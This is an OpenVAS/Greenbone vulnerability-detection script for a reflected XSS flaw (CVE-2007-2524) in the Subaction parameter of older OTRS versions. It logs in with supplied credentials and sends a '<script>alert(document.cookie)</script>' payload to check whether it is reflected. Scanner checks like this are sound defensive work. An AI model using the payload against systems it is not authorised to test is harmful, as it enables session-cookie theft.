# Copyright (C) 2013 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:otrs:otrs";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803934");
  script_version("2022-12-07T10:11:17+0000");
  script_cve_id("CVE-2007-2524");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2022-12-07 10:11:17 +0000 (Wed, 07 Dec 2022)");
  script_tag(name:"creation_date", value:"2013-09-25 12:47:06 +0530 (Wed, 25 Sep 2013)");
  script_name("OTRS Subaction XSS Vulnerability");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to steal the victim's
  cookie-based authentication credentials.");

  script_tag(name:"vuldetect", value:"Tries to login with provided credentials and sends a crafted HTTP
  GET request to check if it is possible to conduct an XSS attack.");

  script_tag(name:"insight", value:"An error exists in index.pl script which fails to validate user-supplied
  input to Subaction parameter properly.");

  script_tag(name:"solution", value:"Upgrade to OTRS (Open Ticket Request System) version 2.0.5 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"OTRS (Open Ticket Request System) is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"affected", value:"OTRS (Open Ticket Request System) version 2.0.1 to 2.0.4");
  script_xref(name:"URL", value:"http://secunia.com/advisories/25205");
  script_xref(name:"URL", value:"http://secunia.com/advisories/25419");
  script_xref(name:"URL", value:"http://secunia.com/advisories/25787");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/23862");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/34164");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("logins.nasl", "secpod_otrs_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("OTRS/installed", "http/login");

  exit(0);
}

include("url_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

function get_otrs_login_cookie(location, otrsport, otrshost)
{
  url = location + "/index.pl?";
  username = urlencode(str:get_kb_item("http/login"));
  password = urlencode(str:get_kb_item("http/password"));
  payload = "Action=Login&RequestedURL=&Lang=en&TimeOffset=-330&User=" + username + "&Password=" + password;

  req = string("POST ",url," HTTP/1.0\r\n",
               "Host: ",otrshost," \r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Referer: http://",otrshost,location,"/index.pl\r\n",
               "Connection: keep-alive\r\n",
               "Content-Length: ", strlen(payload),"\r\n\r\n",
               payload);

  buf = http_keepalive_send_recv(port:otrsport, data:req);
  if(!buf)
    exit(0);

  cookie = eregmatch(pattern:"Set-Cookie: Session=([a-z0-9]+)", string:buf);
  if(!cookie[1])
    exit(0);

  return cookie[1];
}

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!loca = get_app_location(cpe:CPE, port:port))
  exit(0);

if(loca == "/")
  loca = "";

host = http_host_name(port:port);
cookie = get_otrs_login_cookie(location:loca, otrsport:port, otrshost:host);

if(cookie)
{
  url = loca + '/index.pl?Action=AgentTicketMailbox&Subaction="<script>alert(document.cookie)</script>"';
  req = string("GET ", url, " HTTP/1.1\r\n",
               "Host: ", host, " \r\n",
               "Connection: keep-alive\r\n",
               "Cookie: Session=", cookie, "\r\n\r\n");

  res = http_send_recv(port:port, data:req);

  if(ereg(pattern:"^HTTP/1\.[01] 200", string:res) &&
   "<script>alert(document.cookie)</script>" >< res && "Logout" >< res)
  {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
  exit(99);
}

exit(0);
